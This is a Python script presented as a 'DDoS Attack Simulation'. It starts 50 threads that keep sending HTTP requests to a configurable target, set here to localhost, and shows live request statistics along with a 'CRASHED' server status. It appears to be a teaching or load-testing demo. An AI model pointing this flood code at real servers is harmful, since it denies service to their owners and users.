import requests
import threading
import time
import sys
from datetime import datetime
import random
from rich.console import Console
from rich.live import Live
from rich.table import Table

# Configuration
TARGET_URL = "http://localhost:4999"
TOTAL_THREADS = 50  # Number of simultaneous connections
REQUEST_TIMEOUT = 2  # Seconds
console = Console()

class AttackStats:
    def __init__(self):
        self.total_requests = 0
        self.failed_requests = 0
        self.start_time = datetime.now()
        self.response_times = []
        self.active_sessions = 0
        self.lock = threading.Lock()

    def add_request(self, success, response_time=None):
        with self.lock:
            self.total_requests += 1
            if not success:
                self.failed_requests += 1
            if response_time:
                self.response_times.append(response_time)

    def get_avg_response_time(self):
        if not self.response_times:
            return 0
        return sum(self.response_times) / len(self.response_times)

    def update_sessions(self, count):
        with self.lock:
            self.active_sessions = count

stats = AttackStats()

def generate_table() -> Table:
    """Generate stats table for display"""
    table = Table(title="DDoS Attack Simulation Statistics")
    
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="magenta")
    
    duration = (datetime.now() - stats.start_time).total_seconds()
    requests_per_second = stats.total_requests / duration if duration > 0 else 0
    
    table.add_row("Total Requests", str(stats.total_requests))
    table.add_row("Failed Requests", str(stats.failed_requests))
    table.add_row("Requests/second", f"{requests_per_second:.2f}")
    table.add_row("Avg Response Time", f"{stats.get_avg_response_time():.3f}s")
    table.add_row("Active Sessions", str(stats.active_sessions))
    table.add_row("Attack Duration", f"{duration:.1f}s")
    
    if stats.failed_requests / (stats.total_requests or 1) > 0.8:
        table.add_row("Server Status", "[red]CRASHED[/red]")
    else:
        table.add_row("Server Status", "[green]RUNNING[/green]")
    
    return table

def attack_thread():
    """Single attack thread function"""
    while True:
        try:
            # Random delay to make attack more realistic
            time.sleep(random.uniform(0, 0.5))
            
            # Make request and measure response time
            start_time = time.time()
            response = requests.get(f"{TARGET_URL}/", timeout=REQUEST_TIMEOUT)
            response_time = time.time() - start_time
            
            # Update statistics
            stats.add_request(True, response_time)
            
            # Try to get server stats
            try:
                stats_response = requests.get(f"{TARGET_URL}/api/stats", timeout=REQUEST_TIMEOUT)
                if stats_response.status_code == 200:
                    stats.update_sessions(stats_response.json().get('active_sessions', 0))
            except:
                pass
                
        except requests.exceptions.RequestException:
            stats.add_request(False)
            time.sleep(1)  # Back off on failure

def main():
    console.print("[red]DDoS Attack Simulation Starting...[/red]")
    console.print(f"Target: {TARGET_URL}")
    console.print(f"Threads: {TOTAL_THREADS}")
    console.print("\nPress Ctrl+C to stop the attack\n")
    
    # Start attack threads
    threads = []
    for _ in range(TOTAL_THREADS):
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Display live statistics
    with Live(generate_table(), refresh_per_second=2) as live:
        try:
            while True:
                live.update(generate_table())
                time.sleep(0.5)
        except KeyboardInterrupt:
            console.print("\n[yellow]Attack stopped by user[/yellow]")

if __name__ == "__main__":
    main() 